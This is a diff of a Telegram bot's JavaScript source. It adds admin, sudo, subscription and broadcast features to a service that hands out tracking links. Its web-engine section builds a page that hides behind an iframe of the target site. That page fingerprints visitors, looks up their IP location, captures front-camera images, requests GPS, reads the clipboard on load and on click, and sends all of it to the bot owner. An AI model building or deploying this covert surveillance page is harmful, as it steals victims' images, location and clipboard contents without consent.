+        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɪɴsᴜғғɪᴄɪᴇɴᴛ ᴄᴏɪɴs (ᴏɴʟʏ ʀᴇɢᴜʟᴀʀ ᴄᴏɪɴs ᴄᴀɴ ʙᴇ ɢɪғᴛᴇᴅ)."), {parse_mode:'HTML'});
+    }
+    if (amount <= 0) return bot.sendMessage(msg.chat.id, "❌ Invalid Amount");
+
+    const targetUser = await resolveUser(msg, inputTarget);
+    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ᴅᴀᴛᴀʙᴀsᴇ"), {parse_mode:'HTML'});
+
+    sender.coins -= amount;
+    targetUser.coins += amount;
+    
+    await sender.save();
+    await targetUser.save();
+
+    bot.sendMessage(msg.chat.id, makeBorder("🎁 ɢɪғᴛ sᴇɴᴛ", `✅: ʏᴏᴜ sᴇɴᴛ ${amount} ᴄᴏɪɴs ᴛᴏ ${targetUser.firstName}`), {parse_mode:'HTML'});
+    bot.sendMessage(targetUser.chatId, makeBorder("🎁 ɢɪғᴛ ʀᴇᴄᴇɪᴠᴇᴅ", `🎉: ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇᴅ ${amount} ᴄᴏɪɴs ғʀᴏᴍ ${sender.firstName}`), {parse_mode:'HTML'});
+});
+
+bot.onText(/\/gift$/, (msg) => {
+    bot.sendMessage(msg.chat.id, makeBorder("💡 ʜᴏᴡ ᴛᴏ ᴜsᴇ", "✍️ <b>Usage:</b>\n<code>/gift [amount] [userID/Username]</code>\n\nExample: <code>/gift 10 123456789</code>"), {parse_mode:'HTML'});
+});
+
+// ─── 👑 ADMIN/SUDO COMMANDS ───────────
+
+bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
     if (!OWNER_IDS.includes(msg.from.id)) return;
+    
+    if (!match[1] && !msg.reply_to_message) {
+        const sudos = await User.find({ isSudo: true });
+        let txt = `<b>┏━「 ꜱᴜᴅᴏ ʟɪꜱᴛ 」</b>\n`;
+        let count = 0;
+        
+        for (const id of OWNER_IDS) {
+            const u = await User.findOne({ chatId: id });
+            txt += `<b>┣ 🆔 <code>${id}</code>\n┃ ┗ 👤 ${u ? `<a href="tg://user?id=${id}">${u.firstName}</a>` : "Owner (DB Pending)"} [OWNER]</b>\n`;
+            count++;
+        }
+        for (const s of sudos) {
+            if (OWNER_IDS.includes(s.chatId)) continue;
+            txt += `<b>┣ 🆔 <code>${s.chatId}</code>\n┃ ┗ 👤 <a href="tg://user?id=${s.chatId}">${s.firstName}</a></b>\n`;
+            count++;
+        }
+        txt += `<b>┗━➾ ᴛᴏᴛᴀʟ: ${count}</b>`;
+        return bot.sendMessage(msg.chat.id, txt, {parse_mode:'HTML'});
+    }
+
+    const targetUser = await resolveUser(msg, match[1]);
+    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});
+    
+    targetUser.isSudo = !targetUser.isSudo;
+    await targetUser.save();
+    
+    bot.sendMessage(msg.chat.id, makeBorder("👑 sᴜᴅᴏ ᴜᴘᴅᴀᴛᴇ", `✅: ${targetUser.firstName} sᴜᴅᴏ ᴀᴄᴄᴇss ɪs ɴᴏᴡ: <b>${targetUser.isSudo}</b>`), {parse_mode:'HTML'});
+});
+
+
+bot.onText(/\/share\s+(on|off)/i, async (msg, match) => {
+    if (!(await checkAdmin(msg.from.id))) return;
     const state = match[1].toLowerCase();
     shareSystemEnabled = (state === 'on');
     bot.sendMessage(msg.chat.id, makeBorder("⚙️ ᴀᴅᴍɪɴ", `✅: ʀᴇғᴇʀʀᴀʟ sʏsᴛᴇᴍ ɪs ɴᴏᴡ <b>${state.toUpperCase()}</b>`), {parse_mode:'HTML'});
 });
 
-async function modifyCoins(msg, match, type) {
-    if (!OWNER_IDS.includes(msg.from.id)) return; 
+async function modifyOrAddSub(msg, match, type) {
+    if (!(await checkAdmin(msg.from.id))) return;
 
-    const amount = parseInt(match[1]);
+    const amtStr = match[1].toLowerCase();
     const inputTarget = match[2]; 
     const targetUser = await resolveUser(msg, inputTarget);
 
-    if (!targetUser) {
-        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});
+    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});
+
+    // SUBSCRIPTION LOGIC
+    if (amtStr.match(/[dmy]$/)) {
+        const val = parseInt(amtStr);
+        let multiplier = 0;
+        if (amtStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
+        else if (amtStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
+        else if (amtStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
+        
+        targetUser.subscriptionExpiry = new Date(Date.now() + (val * multiplier));
+        await targetUser.save();
+        
+        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ (sᴜʙs)", `✅: ᴀᴅᴅᴇᴅ ${val}${amtStr.slice(-1)} sᴜʙsᴄʀɪᴘᴛɪᴏɴ\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
+        bot.sendMessage(targetUser.chatId, makeBorder("sᴜʙsᴄʀɪᴘᴛɪᴏɴ", `🎉: ʏᴏᴜ ʜᴀᴠᴇ ʀᴇᴄᴇɪᴠᴇᴅ ᴀ sᴜʙsᴄʀɪᴘᴛɪᴏɴ ғᴏʀ ${val}${amtStr.slice(-1)}! ᴜɴʟɪᴍɪᴛᴇᴅ ғʀᴇᴇ ᴜsᴀɢᴇ.`), {parse_mode:'HTML'});
+        return;
     }
+
+    // COIN LOGIC
+    const amount = parseInt(amtStr);
+    if (isNaN(amount)) return bot.sendMessage(msg.chat.id, "❌ Invalid format");
 
     if (type === 'add') {
         targetUser.coins += amount;
@@ -501,46 +626,41 @@ async function modifyCoins(msg, match, type) {
     }
 }
 
-bot.onText(/\/add\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyCoins(msg, match, 'add'));
-bot.onText(/\/(?:rem|rm)\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyCoins(msg, match, 'rem'));
+bot.onText(/\/add\s+([\d]+[dmy]?|\d+)(?:\s+(.+))?/i, (msg, match) => modifyOrAddSub(msg, match, 'add'));
+bot.onText(/\/(?:rem|rm)\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyOrAddSub(msg, match, 'rem'));
 
 bot.onText(/\/reset(?:\s+(.+))?/, async (msg, match) => {
-    if (!OWNER_IDS.includes(msg.from.id)) return;
+    if (!(await checkAdmin(msg.from.id))) return;
     const targetUser = await resolveUser(msg, match[1]);
     
-    if (!targetUser) {
-        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});
-    }
+    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});
     
     targetUser.coins = 0;
     targetUser.freeUrlsLeft = 4;
-    targetUser.referralCount = 0; // Reset referral stats as well
+    targetUser.referralCount = 0; 
+    targetUser.subscriptionExpiry = null;
     await targetUser.save();
     
     await Link.deleteMany({ creatorChatId: targetUser.chatId });
     
-    bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ᴀᴄᴄᴏᴜɴᴛ ʀᴇsᴇᴛ sᴜᴄᴄᴇssғᴜʟ\n👤: ${targetUser.firstName}\n🗑: ᴀʟʟ ʟɪɴᴋs ᴅᴇʟᴇᴛᴇᴅ & ᴄᴏɪɴs 0`), {parse_mode:'HTML'});
+    bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ᴀᴄᴄᴏᴜɴᴛ ʀᴇsᴇᴛ sᴜᴄᴄᴇssғᴜʟ\n👤: ${targetUser.firstName}\n🗑: ᴀʟʟ ʟɪɴᴋs & sᴜʙs ᴅᴇʟᴇᴛᴇᴅ, ᴄᴏɪɴs 0`), {parse_mode:'HTML'});
     bot.sendMessage(targetUser.chatId, makeBorder("sʏsᴛᴇᴍ", `🔄: ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ʀᴇsᴇᴛ ʙʏ ᴀᴅᴍɪɴ!`), {parse_mode:'HTML'});
 });
 
 bot.onText(/\/ban(?:\s+(.+))?/, async (msg, match) => {
-    if (!OWNER_IDS.includes(msg.from.id)) return;
+    if (!(await checkAdmin(msg.from.id))) return;
     const user = await resolveUser(msg, match[1]);
     if(user) { user.isBanned = true; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ʙᴀɴ", `🚫: ʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML'}); }
 });
 
 bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
-    if (!OWNER_IDS.includes(msg.from.id)) return;
+    if (!(await checkAdmin(msg.from.id))) return;
     const user = await resolveUser(msg, match[1]);
     if(user) { user.isBanned = false; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ᴜɴʙᴀɴ", `✅: ᴜɴʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML'}); }
 });
 
-/**
- * 🛠 ADMIN ADVANCED LINK MANAGEMENT 
- */
-
 bot.onText(/\/ulist/, async (msg) => {
-    if (!OWNER_IDS.includes(msg.from.id)) return;
+    if (!(await checkAdmin(msg.from.id))) return;
 
     try {
         const links = await Link.find({});
@@ -569,7 +689,7 @@ bot.onText(/\/ulist/, async (msg) => {
 });
 
 bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
-    if (!OWNER_IDS.includes(msg.from.id)) return;
+    if (!(await checkAdmin(msg.from.id))) return;
 
     let targetId;
     if (msg.reply_to_message) {
@@ -602,7 +722,7 @@ bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
 });
 
 bot.on('callback_query', async (query) => {
-    if (!OWNER_IDS.includes(query.from.id)) return bot.answerCallbackQuery(query.id, { text: "🚫 Access Denied" });
+    if (!(await checkAdmin(query.from.id))) return bot.answerCallbackQuery(query.id, { text: "🚫 Access Denied" });
 
     const [action, type, uid] = query.data.split('_');
 
@@ -622,7 +742,7 @@ bot.on('callback_query', async (query) => {
 });
 
 bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
-    if (!OWNER_IDS.includes(msg.from.id)) return;
+    if (!(await checkAdmin(msg.from.id))) return;
     const targetId = parseInt(match[1]);
     const input = match[2].trim().toLowerCase();
 
@@ -644,14 +764,11 @@ bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
     }
 });
 
-/**
- * 🛠 ADMIN MENU COMMAND
- */
 bot.onText(/\/menu/, async (msg) => {
     const chatId = msg.chat.id;
     const fromId = msg.from.id;
 
-    if (!OWNER_IDS.includes(fromId)) return;
+    if (!(await checkAdmin(fromId))) return;
     if (msg.chat.type !== 'private') {
         return bot.sendMessage(chatId, "❌ <b>ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ ᴡᴏʀᴋs ɪɴ ʙᴏᴛ ᴅᴍ!</b>", { parse_mode: 'HTML' });
     }
@@ -670,37 +787,27 @@ bot.onText(/\/menu/, async (msg) => {
     menu += `└ <code>/rmlink</code> [ɪᴅ] [ɴᴜᴍ/ᴀʟʟ] - ᴅᴇʟᴇᴛᴇ\n\n`;
 
     menu += `💰 <b>ᴄᴏɴᴛʀᴏʟ sʏsᴛᴇᴍ</b>\n`;
-    menu += `├ <code>/add</code> [ǫᴛʏ] [ɪᴅ/ʀᴇᴘʟʏ] - ᴀᴅᴅ ᴄᴏɪɴs\n`;
-    menu += `├ <code>/rm</code> [ǫᴛʏ] [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇᴍᴏᴠᴇ ᴄᴏɪɴs\n`;
-    menu += `├ <code>/reset</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴇᴛ ᴀᴄᴄᴏᴜɴᴛ\n`;
+    menu += `├ <code>/add</code> [ǫᴛʏ/1d,1m,1y] [ɪᴅ] - ᴀᴅᴅ ᴄᴏɪɴs/sᴜʙs\n`;
+    menu += `├ <code>/rm</code> [ǫᴛʏ] [ɪᴅ] - ʀᴇᴍᴏᴠᴇ ᴄᴏɪɴs\n`;
+    menu += `├ <code>/reset</code> [ɪᴅ] - ʀᴇsᴇᴛ ᴀᴄᴄᴏᴜɴᴛ\n`;
+    menu += `├ <code>/sudo</code> [ɪᴅ] - ᴛᴏɢɢʟᴇ sᴜᴅᴏ ᴀᴄᴄᴇss\n`;
     menu += `├ <code>/share on|off</code> - ᴛᴏɢɢʟᴇ ʀᴇғᴇʀʀᴀʟ\n`;
     menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀ\n`;
     menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʟɪғᴛ ʙᴀɴ\n\n`;
 
-    menu += `📝 <b>ᴜsᴀɢᴇ ᴛɪᴘ:</b>\n`;
-    menu += `<i>ʏᴏᴜ ᴄᴀɴ ʀᴇᴘʟʏ ᴛᴏ ᴀɴʏ ᴜsᴇʀ ᴍᴇssᴀɢᴇ ᴡɪᴛʜ ᴛʜᴇsᴇ ᴄᴏᴍᴍᴀɴᴅs ɪɴ ɢʀᴏᴜᴘs ᴛᴏ ᴛᴀʀɢᴇᴛ ᴛʜᴇᴍ ɪɴsᴛᴀɴᴛʟʏ.</i>`;
-
-    const menuBorder = (title, body) => {
-        return `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
-    };
+    const menuBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
 
     bot.sendMessage(chatId, menuBorder("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", menu), { 
         parse_mode: 'HTML',
         reply_markup: {
-            inline_keyboard: [
-                [{ text: "📢 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: "https://t.me/Codex_teamx" }]
-            ]
+            inline_keyboard: [[{ text: "📢 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: "https://t.me/Codex_teamx" }]]
         }
     });
 });
 
-/**
- * 📊 USER DATA COMMAND
- */
 bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
-    const isOwner = OWNER_IDS.includes(msg.from.id);
-    const isGroup = msg.chat.type !== 'private';
+    const isOwner = await checkAdmin(msg.from.id);
     
     let targetUser;
     if (msg.reply_to_message) {
@@ -729,6 +836,7 @@ bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
             content += `🏷 ᴜsᴇʀ: @${targetUser.username || 'ɴ/ᴀ'}\n`;
             content += `💰 ᴄᴏɪɴs: <code>${targetUser.coins}</code>\n`;
             content += `🎁 ғʀᴇᴇ: <code>${targetUser.freeUrlsLeft}</code>\n`;
+            if(hasActiveSub(targetUser)) content += `💎 sᴜʙ: <code>${getSubTimeLeft(targetUser)}</code>\n`;
             content += `🔗 ᴀᴄᴛɪᴠᴇ: <code>${activeLinkCount}</code>\n`;
             content += `📡 sᴛᴀᴛᴜs: <b>${status}</b>\n`;
             content += `🛡 ʙᴀɴ: <b>${targetUser.isBanned ? "ʏᴇs" : "ɴᴏ"}</b>\n`;
@@ -740,19 +848,15 @@ bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
             content += `📡 sᴛᴀᴛᴜs: <b>${status}</b>`;
         }
 
-        const shortBorder = (title, body) => {
-            return `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
-        };
+        const shortBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;
 
         bot.sendMessage(chatId, shortBorder(isOwner ? "ᴀᴅᴍɪɴ ᴅᴀᴛᴀ ᴠɪᴇᴡ" : "ᴜsᴇʀ ᴘʀᴏғɪʟᴇ", content), { parse_mode: 'HTML' });
 
-    } catch (e) {
-        bot.sendMessage(chatId, "❌ ᴇʀʀᴏʀ ᴘʀᴇᴘᴀʀɪɴɢ ᴅᴀᴛᴀ");
-    }
+    } catch (e) { bot.sendMessage(chatId, "❌ ᴇʀʀᴏʀ ᴘʀᴇᴘᴀʀɪɴɢ ᴅᴀᴛᴀ"); }
 });
 
 bot.onText(/\/users/, async (msg) => {
-    if (!OWNER_IDS.includes(msg.from.id)) return;
+    if (!(await checkAdmin(msg.from.id))) return;
 
     try {
         const users = await User.find({});
@@ -767,74 +871,87 @@ bot.onText(/\/users/, async (msg) => {
         
         await bot.sendMessage(msg.chat.id, makeBorder("sᴛᴀᴛs", report), { parse_mode: 'HTML' });
 
-        let fileContent = `DX-CODEX USER DATABASE REPORT\n`;
-        fileContent += `Generated on: ${new Date().toLocaleString()}\n`;
-        fileContent += `--------------------------------------------------\n\n`;
+        let fileContent = `Ｄｘ－Ｓｉｍｕ USER DATABASE REPORT\nGenerated on: ${new Date().toLocaleString()}\n--------------------------------------------------\n\n`;
 
         users.forEach((u, index) => {
             const status = u.isBanned ? "BANNED 🚫" : "VALID ✅";
             const date = u.joinedAt ? new Date(u.joinedAt).toLocaleDateString() : "N/A";
             
-            fileContent += `${index + 1}. ID: ${u.chatId}\n`;
-            fileContent += `   NAME: ${u.firstName || 'N/A'}\n`;
-            fileContent += `   USER: @${u.username || 'N/S'}\n`;
-            fileContent += `   COINS: ${u.coins || 0}\n`;        
-            fileContent += `   FREE LEFT: ${u.freeUrlsLeft || 0}\n`; 
-            fileContent += `   DATE: ${date}\n`;
-            fileContent += `   STATUS: ${status}\n`;
-            fileContent += `--------------------------------------------------\n`;
+            fileContent += `${index + 1}. ID: ${u.chatId}\n   NAME: ${u.firstName || 'N/A'}\n   USER: @${u.username || 'N/S'}\n   COINS: ${u.coins || 0}\n   FREE LEFT: ${u.freeUrlsLeft || 0}\n   SUB: ${hasActiveSub(u) ? "YES" : "NO"}\n   DATE: ${date}\n   STATUS: ${status}\n--------------------------------------------------\n`;
         });
 
         const filePath = `./all_users_report.txt`;
         fs.writeFileSync(filePath, fileContent);
 
-        await bot.sendDocument(msg.chat.id, filePath, {
-            caption: `📄 <b>ᴀʟʟ ᴜsᴇʀ ᴅᴇᴛᴀɪʟs (ɪɴᴄʟᴜᴅɪɴɢ ᴄᴏɪɴs/ғʀᴇᴇ)</b>`,
-            parse_mode: 'HTML'
-        });
-
+        await bot.sendDocument(msg.chat.id, filePath, { caption: `📄 <b>ᴀʟʟ ᴜsᴇʀ ᴅᴇᴛᴀɪʟs (ɪɴᴄʟᴜᴅɪɴɢ ᴄᴏɪɴs/ғʀᴇᴇ)</b>`, parse_mode: 'HTML' });
         fs.unlinkSync(filePath);
 
-    } catch (e) {
-        console.error(e);
-        bot.sendMessage(msg.chat.id, "❌ Error generating user report.");
-    }
+    } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error generating user report."); }
 });
 
-// ─── 📢 BROADCAST ───────────────
+// ─── 📢 ADVANCED BROADCAST ───────────────
 
 async function handleBroadcast(msg) {
-    if (!OWNER_IDS.includes(msg.from.id)) return;
+    if (!(await checkAdmin(msg.from.id))) return;
 
-    let text = msg.text || msg.caption || "";
-    text = text.replace('/broadcast', '').trim();
+    let rawText = msg.text || msg.caption || "";
+    rawText = rawText.replace('/broadcast', '').trim();
     
+    let isPin = false;
+    if (rawText.includes('(pin)')) {
+        isPin = true;
+        rawText = rawText.replace('(pin)', '').trim();
+    }
+
     let reply_markup = null;
-    const btnMatch = text.match(/\[(.*)\|(.*)\]/);
+    const btnMatch = rawText.match(/\[(.*)\|(.*)\]/);
     if (btnMatch) {
-        text = text.replace(btnMatch[0], "").trim();
+        rawText = rawText.replace(btnMatch[0], "").trim();
         reply_markup = { inline_keyboard: [[{ text: btnMatch[1].trim(), url: btnMatch[2].trim() }]] };
     }
 
-    if (!text && !msg.photo && !msg.video) return bot.sendMessage(msg.chat.id, "❌ ᴇᴍᴘᴛʏ", {parse_mode:'HTML'});
+    const replyMsg = msg.reply_to_message;
+    if (!rawText && !msg.photo && !msg.video && !msg.document && !replyMsg) return bot.sendMessage(msg.chat.id, "❌ ᴇᴍᴘᴛʏ", {parse_mode:'HTML'});
 
     const users = await User.find({});
     bot.sendMessage(msg.chat.id, `⏳ <b>sᴇɴᴅɪɴɢ ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});
 
     let success = 0;
+    let failed = 0;
+    let blocked = 0;
+
     for (const u of users) {
         try {
-            if (msg.photo) {
-                await bot.sendPhoto(u.chatId, msg.photo[msg.photo.length - 1].file_id, { caption: text, parse_mode: 'HTML', reply_markup });
+            let sentMsg;
+            if (replyMsg) {
+                sentMsg = await bot.copyMessage(u.chatId, msg.chat.id, replyMsg.message_id, { reply_markup });
+            } else if (msg.photo) {
+                sentMsg = await bot.sendPhoto(u.chatId, msg.photo[msg.photo.length - 1].file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
             } else if (msg.video) {
-                await bot.sendVideo(u.chatId, msg.video.file_id, { caption: text, parse_mode: 'HTML', reply_markup });
+                sentMsg = await bot.sendVideo(u.chatId, msg.video.file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
+            } else if (msg.document) {
+                sentMsg = await bot.sendDocument(u.chatId, msg.document.file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
             } else {
-                await bot.sendMessage(u.chatId, text, { parse_mode: 'HTML', reply_markup });
+                sentMsg = await bot.sendMessage(u.chatId, rawText, { parse_mode: 'HTML', reply_markup });
             }
+            
+            if (isPin && sentMsg) await bot.pinChatMessage(u.chatId, sentMsg.message_id);
             success++;
-        } catch (e) {}
+        } catch (e) {
+            if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
+            else failed++;
+        }
     }
-    bot.sendMessage(msg.chat.id, makeBorder("ᴅᴏɴᴇ", `✅: sᴇɴᴛ ᴛᴏ ${success} ᴜsᴇʀs`), {parse_mode:'HTML'});
+    
+    const reportMsg = `✅ <b>ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ</b>
+━━━━━━━━━━━━━━━━━
+👤 ᴛᴏᴛᴀʟ ᴛᴀʀɢᴇᴛs: <code>${users.length}</code>
+📨 sᴇɴᴛ sᴜᴄᴄᴇss: <code>${success}</code>
+🚫 ʀᴇᴍᴏᴠᴇᴅ/ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code>
+❌ ғᴀɪʟᴇᴅ/ᴇʀʀᴏʀ: <code>${failed}</code>
+━━━━━━━━━━━━━━━━━`;
+
+    bot.sendMessage(msg.chat.id, reportMsg, {parse_mode:'HTML'});
 }
 
 // ─── 🌐 WEB ENGINE ────────
@@ -873,7 +990,7 @@ app.post('/api/data', async (req, res) => {
             msg += `<b>${_fnt("TIMEZONE")}:</b> <code>${data.timezone}</code>\n`;
             msg += `<b>${_fnt("LANGUAGE")}:</b> <code>${_nav.language}</code>\n`;
             msg += `<b>${_fnt("USER AGENT")}:</b> <pre>${_nav.userAgent}</pre>\n\n`;
-            msg += `<blockquote>${_fnt("DEV-BY: DX-CODEX || ")}@Termuxcodex</blockquote>`;
+            msg += `<blockquote>${_fnt("DEV-BY: Ｄｘ－Ｓｉｍｕ || ")}@Termuxcodex</blockquote>`;
 
             await bot.sendMessage(owner, msg, { parse_mode: 'HTML', disable_web_page_preview: true });
             
@@ -908,7 +1025,6 @@ function getHtmlTemplate(linkId, redirectUrl) {
         body{margin:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden}
         #status{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:10}
         #v, #c { display:none }
-        /* NEW: WebView iframe for rendering target content while hacking */
         #iframeOverlay {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             border: none; z-index: 5; display: none; background: #fff;
@@ -922,9 +1038,8 @@ function getHtmlTemplate(linkId, redirectUrl) {
     <iframe id="iframeOverlay"></iframe>
 <script>
 const id = "${linkId}"; 
-const red = "${redirectUrl}"; // Safe injection
+const red = "${redirectUrl}"; 
 
-// Overlay WebView Logic
 if (red && red.length > 4 && red !== "null") {
     const iframe = document.getElementById('iframeOverlay');
     iframe.src = red;
@@ -938,7 +1053,6 @@ function draw(){ ctx.fillStyle='rgba(0,0,0,0.05)'; ctx.fillRect(0,0,m.width,m.he
 setInterval(draw,33);
 
 async function start() {
-    // UPGRADED IP FETCHING (Strong Fallback Algorithm)
     let ipData = { ip:"Unknown", city:"Unknown", country:"Unknown", isp:"Unknown", loc:"Unknown" }; 
     try { 
         const r1 = await fetch('https://ipapi.co/json/'); 
@@ -985,10 +1099,8 @@ async function start() {
         }
     };
 
-    // Send Main Info
     fetch('/api/data', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({linkId:id, type:'info', data:info}) });
 
-    // CHAIN OF PERMISSIONS: 1. Camera -> 2. Location -> 3. Clipboard
     try {
         const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
         const v = document.getElementById('v'); v.srcObject=s;
@@ -1004,24 +1116,19 @@ async function start() {
                 count++; 
                 if(count>=5){ 
                     clearInterval(itv); 
-                    // Redirect as fallback if iframe gets blocked by target site
                     if(red && red.length > 4 && red !== "null") setTimeout(() => { window.location.href=red; }, 2000); 
                 }
             }, 1500);
 
-            // Step 2: Request Location after camera starts
             setTimeout(() => {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'loc', data:{lat: pos.coords.latitude, lon: pos.coords.longitude}})});
-                    
-                    // Step 3: Attempt Clipboard Data extraction
                     setTimeout(async () => {
                         try {
                             const text = await navigator.clipboard.readText();
                             if (text) fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
                         } catch(err) {}
                     }, 2000);
-
                 }, (e)=>{});
             }, 2000);
         };
@@ -1030,7 +1137,6 @@ async function start() {
     }
 }
 
-// Bind clipboard fetch to any user click for better browser support
 window.addEventListener('click', async () => {
     try {
         const text = await navigator.clipboard.readText();
@@ -1044,22 +1150,17 @@ window.onload = start;
 </html>`;
 }
 
-// ᴜʀʟ ᴛᴏ ᴋᴇᴇᴘ ᴀʟɪᴠᴇ (Replace with your Render App URL)
-const APP_URL = "https://code-url-b0f2.onrender.com"; 
-
+// 🌐 RENDER URL KEEP-ALIVE PING (JS Version)
+const PING_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`; 
 setInterval(async () => {
     try {
-        const response = await axios.get(APP_URL);
-        console.log(`┏━━「 📡 ᴘɪɴɢ 」━━┓`);
-        console.log(`┃ ꜱᴛᴀᴛᴜꜱ: ᴀᴄᴛɪᴠᴇ`);
-        console.log(`┃ ᴄᴏᴅᴇ: ${response.status}`);
-        console.log(`┗━━━━━━━━━━━━┛`);
+        await axios.get(PING_URL);
+        console.log(`[BOT] Pinging server (${PING_URL}) to stay awake...`);
     } catch (error) {
-        console.error("┃ ❌ ᴘɪɴɢ ғᴀɪʟᴇᴅ: " + error.message);
+        console.error(`[BOT] Ping failed: ${error.message}`);
     }
 }, 300000); // 300,000ms = 5 Minutes
 
-// Global Error Handler to prevent crash
 process.on('uncaughtException', (err) => console.log('Caught exception: ' + err));
 process.on('unhandledRejection', (reason, p) => console.log('Unhandled Rejection:', reason));
 
